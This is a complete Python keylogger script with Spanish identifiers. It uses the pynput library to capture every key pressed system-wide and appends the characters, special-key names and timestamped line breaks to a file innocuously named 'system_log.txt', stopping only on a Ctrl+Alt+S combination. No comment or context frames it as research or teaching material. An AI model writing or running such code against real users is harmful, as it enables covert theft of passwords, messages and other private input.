from pynput import keyboard
from datetime import datetime

LOG_FILE = "system_log.txt"

COMBINACION_CIERRE = {keyboard.Key.ctrl_l, keyboard.Key.alt_l, keyboard.KeyCode.from_char('s')}
teclas_presionadas = set()

def grabar_en_archivo(texto):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(texto)

def on_press(key):

    if key in COMBINACION_CIERRE:
        teclas_presionadas.add(key)
        if all(k in teclas_presionadas for k in COMBINACION_CIERRE):
            return False 

    try:
        char = key.char
        grabar_en_archivo(char)
    except AttributeError:
     
        if key == keyboard.Key.space:
            grabar_en_archivo(" ")
        elif key == keyboard.Key.enter:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            grabar_en_archivo(f" [ENTER - {timestamp}]\n")
        elif key == keyboard.Key.backspace:
            grabar_en_archivo("[BACK]")
        else:
            
            grabar_en_archivo(f"[{key.name.upper()}]")

def on_release(key):
    if key in teclas_presionadas:
        teclas_presionadas.remove(key)

def main():

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
